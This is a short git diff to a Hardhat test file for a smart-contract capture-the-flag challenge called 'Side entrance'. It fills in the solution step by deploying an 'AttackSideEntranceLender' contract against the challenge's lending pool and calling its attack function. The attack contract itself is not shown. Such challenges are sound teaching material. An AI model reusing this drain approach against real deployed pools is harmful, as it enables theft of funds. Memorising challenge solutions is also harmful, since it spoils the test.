@@ -5,7 +5,7 @@ const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 describe('[Challenge] Side entrance', function () {
     let deployer, player;
     let pool;
-
+ 
     const ETHER_IN_POOL = 1000n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
 
@@ -26,6 +26,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        this.attackerContract = await(await ethers.getContractFactory('AttackSideEntranceLender', player)).deploy(
+            pool.address, player.address
+        );
+        await this.attackerContract.attack();
     });
 
     after(async function () {
